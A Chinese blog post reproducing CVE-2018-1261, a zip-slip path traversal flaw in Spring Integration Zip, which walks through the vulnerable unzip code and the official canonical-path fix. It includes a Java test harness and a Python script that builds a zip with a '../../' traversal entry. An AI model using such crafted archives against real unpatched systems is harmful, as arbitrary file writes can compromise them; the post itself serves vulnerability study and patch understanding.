# Spring Integration Zip 不安全解压（CVE-2018-1261）漏洞复现 - 羊小弟 - 博客园

> 原文：[`www.cnblogs.com/yangxiaodi/p/9036916.html`](https://www.cnblogs.com/yangxiaodi/p/9036916.html)

不敢说分析，还是太菜了，多学习。

文章来源： [猎户安全实验室](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483879&idx=1&sn=185dce2b807ee03561682ee2a5e17ff4&chksm=ea3f3d35dd48b42323fab95af6dc9b3862d7247e2a01ff931d47b8262fa1af0c518d63bbfa1e&mpshare=1&scene=1&srcid=0512RGhUMnV1Odi9FmLtS3oR&key=8c1cdf2482a215c7a523b06a9261db69bf9589a1b3a3a71aa72f02a6955b3362ab68518098dbe847700d0372b70274f6d01707615d35c03bd1f02d132d05aae4c1a8392353bef01c3fa1059a280a9ce8&ascene=0&uin=MjcxMDMwNTAyOQ%3D%3D&devicetype=iMac+MacBookPro12%2C1+OSX+OSX+10.11.6+build(15G31)&version=11020201&lang=zh_CN&pass_ticket=TAKqq4U5oHaXG3vEKqcit5zIeoIbmTuBUwiVKeUJPFp2zSdYYvnIK11t9utt2Hf1)

存在漏洞的源码下载地址：https://github.com/spring-projects/spring-integration-extensions/releases/tag/zip.v1.0.0.RELEASE

代码下载两眼相望了好久，第一次弄这些东西，踩了好久的坑，边踩边学习。

用的是 IDEA 来复现： 终端打开到 zip 的文件夹，然后./gradlew idea 。直接就能直接用 IDEA 打开了。

漏洞地址：org/springframework/integration/zip/transformer/UnZipTransformerTests.java

这里的都是官方例子。

仿造官方例子写个测试类。

```
	@Test
	public void unzipCve() throws IOException, InterruptedException {

		final Resource resource = this.resourceLoader.getResource("classpath:testzipdata/test1.zip");
		final InputStream upZipFile = resource.getInputStream();
		UnZipTransformer unZipTransformer = new UnZipTransformer();
		unZipTransformer.setWorkDirectory(new File("/Users/yangxiaodi/java/CVE-2018-1261/spring-integration-extensions-zip.v1.0.0.RELEASE/spring-integration-zip/src/test/resources/testzipdata/"));
		unZipTransformer.setZipResultType(ZipResultType.FILE);//设置类型（FILE, BYTE_ARRAY）
		unZipTransformer.afterPropertiesSet();

		Message<InputStream> message = MessageBuilder.withPayload(upZipFile).build();

		unZipTransformer.transform(message);//漏洞入口。
		System.out.println("over");
	}

}

```

这里的 zip 解压要用 到../../../z.txt 格式的压缩文件，用 python 脚本生成一个。

```
import zipfile

if __name__ == "__main__":
    try:
        binary = b'ddddsss'
        zipFile = zipfile.ZipFile("test1.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test1.zip")
        zipFile.writestr("../../dddwwtest.txt", binary)
        zipFile.close()
    except IOError as e:
        raise e

```

东西都准备妥当了，开始分析漏洞吧。

漏洞入口：

unZipTransformer.transform(message);

接着调用 org/springframework/integration/zip/transformer/AbstractZipTransformer.java 下的 doTransform()函数。

```
	@Override
	protected Object doTransform(Message<?> message) throws Exception {
		Assert.notNull(message, "message must not be null");
		final Object payload = message.getPayload();
		Assert.notNull(payload, "payload must not be null");

		return doZipTransform(message);//往下调用 doZipTransform 函数
	}

```

在调用 org/springframework/integration/zip/transformer/UnZipTransformer.java 下的 doZipTransform() 函数。

漏洞就出现在 doZipTransform()函数。具体代码位置：

```
				ZipUtil.iterate(inputStream, new ZipEntryCallback() {//漏洞没过滤的地方

					@Override
					public void process(InputStream zipEntryInputStream, ZipEntry zipEntry) throws IOException {

						final String zipEntryName = zipEntry.getName();
						final long zipEntryTime = zipEntry.getTime();
						final long zipEntryCompressedSize = zipEntry.getCompressedSize();
						final String type = zipEntry.isDirectory() ? "directory" : "file";

						if (logger.isInfoEnabled()) {
							logger.info(String.format("Unpacking Zip Entry - Name: '%s',Time: '%s', " +
									"Compressed Size: '%s', Type: '%s'",
									zipEntryName, zipEntryTime, zipEntryCompressedSize, type));
						}

						if (ZipResultType.FILE.equals(zipResultType)) {
							final File tempDir = new File(workDirectory, message.getHeaders().getId().toString());
							tempDir.mkdirs(); //NOSONAR false positive,创建文件夹
							final File destinationFile = new File(tempDir, zipEntryName);

							if (zipEntry.isDirectory()) {
								destinationFile.mkdirs(); //NOSONAR false positive
							}
							else {
								SpringZipUtils.copy(zipEntryInputStream, destinationFile);
								uncompressedData.put(zipEntryName, destinationFile);
							}
						}
						else if (ZipResultType.BYTE_ARRAY.equals(zipResultType)) {
							if (!zipEntry.isDirectory()) {
								byte[] data = IOUtils.toByteArray(zipEntryInputStream);
								uncompressedData.put(zipEntryName, data);
							}
						}
						else {
							throw new IllegalStateException("Unsupported zipResultType " + zipResultType);
						}
					}

```

调用 ZipUtil.iterate()函数，然后利用回调函数 ZipEntryCallback()去处理解压出来的内容。

这里的 final String zipEntryName = zipEntry.getName();  //就是解压出来的文件内容，

在 final File destinationFile = new File(tempDir, zipEntryName); //这里没任何过滤就进行文件路径和文件名的拼接。

然后下面两句代码把文件给复制过去。

```
SpringZipUtils.copy(zipEntryInputStream, destinationFile);
uncompressedData.put(zipEntryName, destinationFile);

```

这里有个坑，就是../../../z.txt 的文件，不能存在未创建的文件夹路径，例如：   ../../zzz/z.txt ，在 zzz 文件夹不存在的情况下，会报错。

这里来看下他们官方的漏洞修复，增加了一个路径检测函数。[官方地址](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b#diff-990b7a04b25d4c5b7cb46f536ac149b0)

```
					public File checkPath(final Message<?> message, final String zipEntryName) throws IOException {
						final File tempDir = new File(workDirectory, message.getHeaders().getId().toString());
						tempDir.mkdirs(); //NOSONAR false positive
						final File destinationFile = new File(tempDir, zipEntryName);

						/* If we see the relative traversal string of ".." we need to make sure
						 * that the outputdir + name doesn't leave the outputdir.
						 */
						if (!destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) {
							throw new ZipException("The file " + zipEntryName +
									" is trying to leave the target output directory of " + workDirectory);
						}
						return destinationFile;
					}

```

主要看这句话：

if (!destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath()))

如果 destinationFile.getCanonicalPath() 也就是当前的全文件路径，例如： /etc/s/../passwd ，会变成/etc/passwd ，

全文件路径中 开头不包含 workDirectory.getCanonicalPath() 的路径，就报错。 例如：/etc/s/  ，而 workDirectory 是定义的路径。

综上就是路径不能往前跳转。

这种路径检测方法还是学到了，本以为会过滤“..” 这样的字符串，直接对比两次的路径也是个好方法